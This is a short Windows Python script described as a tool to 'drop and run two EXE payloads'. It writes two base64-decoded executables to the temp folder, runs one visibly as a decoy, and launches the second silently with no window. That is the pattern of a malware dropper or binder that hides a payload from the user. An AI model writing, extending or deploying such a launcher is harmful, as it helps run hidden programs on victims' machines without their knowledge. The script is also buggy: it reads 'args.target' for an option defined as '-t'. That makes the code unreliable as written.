import base64
import subprocess
import os
import tempfile
import sys
import argparse

def encode_exe_to_base64(exe_path):
    with open(exe_path, "rb") as f:
        return base64.b64encode(f.read()).decode("ascii")

def decode_and_run_exe(base64_str, filename, run_silent=False):
    exe_bytes = base64.b64decode(base64_str)
    temp_dir = tempfile.gettempdir()
    file_path = os.path.join(temp_dir, filename)
    with open(file_path, "wb") as f:
        f.write(exe_bytes)
    try:
        if run_silent:
            subprocess.run([file_path], creationflags=subprocess.CREATE_NO_WINDOW, check=False)
        else:
            subprocess.Popen([file_path])
    except Exception as e:
        print(f"Error running {filename}: {e}")

def main():
    parser = argparse.ArgumentParser(description="Drop and run two EXE payloads on Windows.")
    parser.add_argument('-t', type=str, required=True, help='Path to the first EXE to drop and run (visible)')
    parser.add_argument('-p', type=str, required=True, help='Path to the second EXE to drop and run (silent)')
    args = parser.parse_args()

    exe1_path = args.target
    exe2_path = args.p

    if not os.path.isfile(exe1_path):
        print(f"[!] Target EXE not found: {exe1_path}")
        sys.exit(1)
    if not os.path.isfile(exe2_path):
        print(f"[!] Payload EXE not found: {exe2_path}")
        sys.exit(1)

    exe1_base64 = encode_exe_to_base64(exe1_path)
    exe2_base64 = encode_exe_to_base64(exe2_path)

    decode_and_run_exe(exe1_base64, os.path.basename(exe1_path), run_silent=False)
    decode_and_run_exe(exe2_base64, os.path.basename(exe2_path), run_silent=True)

if __name__ == "__main__":
    if sys.platform != "win32":
        print("This script is intended to be run on Windows.")
        sys.exit(1)
    main()